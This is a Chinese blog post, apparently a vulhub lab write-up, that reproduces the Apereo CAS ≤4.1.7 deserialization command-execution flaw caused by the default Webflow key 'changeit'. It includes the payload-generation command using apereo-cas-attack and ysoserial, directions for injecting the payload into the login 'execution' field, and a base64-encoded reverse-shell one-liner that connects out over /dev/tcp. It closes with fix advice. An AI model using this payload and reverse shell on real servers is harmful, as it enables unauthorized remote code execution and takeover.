---
title: Apereo CAS 4.1 反序列化命令执行漏洞复现
author: jh2ng
cover: 'http://image.jh2ing.com/image-20220702172902702.png'
tags:
  - vulhub
categories:
  - 漏洞复现
abbrlink: 60630
date: 2022-07-02 20:00:00
---

### Apereo CAS 4.1 反序列化命令执行漏洞

#### 漏洞描述

Apereo CAS是一款Apereo发布的集中认证服务平台，常被用于企业内部单点登录系统。Apereo CAS存在一处默认密钥的问题，利用这个默认密钥我们可以构造恶意信息触发目标反序列化漏洞，进而执行任意命令。

#### 影响版本

Apereo CAS <= 4.1.7 

#### 环境搭建

![image-20220702172835955](http://image.jh2ing.com/image-20220702172835955.png)

环境启动后，访问`http://your-ip:8080/cas/login`即可查看到登录页面。

![image-20220702172902702](http://image.jh2ing.com/image-20220702172902702.png)



#### 漏洞复现

漏洞原理实际上是Webflow中使用了默认密钥`changeit`：

```
public class EncryptedTranscoder implements Transcoder {
    private CipherBean cipherBean;
    private boolean compression = true;

    public EncryptedTranscoder() throws IOException {
        BufferedBlockCipherBean bufferedBlockCipherBean = new BufferedBlockCipherBean();
        bufferedBlockCipherBean.setBlockCipherSpec(new BufferedBlockCipherSpec("AES", "CBC", "PKCS7"));
        bufferedBlockCipherBean.setKeyStore(this.createAndPrepareKeyStore());
        bufferedBlockCipherBean.setKeyAlias("aes128");
        bufferedBlockCipherBean.setKeyPassword("changeit");
        bufferedBlockCipherBean.setNonce(new RBGNonce());
        this.setCipherBean(bufferedBlockCipherBean);
    }

    // ...
```

我们使用[Apereo-CAS-Attack](https://github.com/vulhub/Apereo-CAS-Attack)来复现这个漏洞。使用ysoserial的CommonsCollections4生成加密后的Payload：

```
java -jar apereo-cas-attack-1.0-SNAPSHOT-all.jar CommonsCollections4 "touch /tmp/success"
```

![image-20220702173138357](http://image.jh2ing.com/image-20220702173138357.png)

然后我们登录CAS并抓包，将Body中的`execution`值替换成上面生成的Payload发送：

![image-20220702173613099](http://image.jh2ing.com/image-20220702173613099.png)

登录Apereo CAS，可见`touch /tmp/success`已成功执行：

![image-20220702173816165](http://image.jh2ing.com/image-20220702173816165.png)

反弹shell：

```
# 对shell语句进行base64加密
bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMTIu.....}|{base64,-d}|{bash,-i}
```

![image-20220702200352565](http://image.jh2ing.com/image-20220702200352565.png)

![image-20220702200450867](http://image.jh2ing.com/image-20220702200450867.png)

![image-20220702200557519](http://image.jh2ing.com/image-20220702200557519.png)

> 建议在base64加密时使用burp中的加密工具


#### 修复建议

- 修改Webflow中的默认密钥
- 升级到最新版

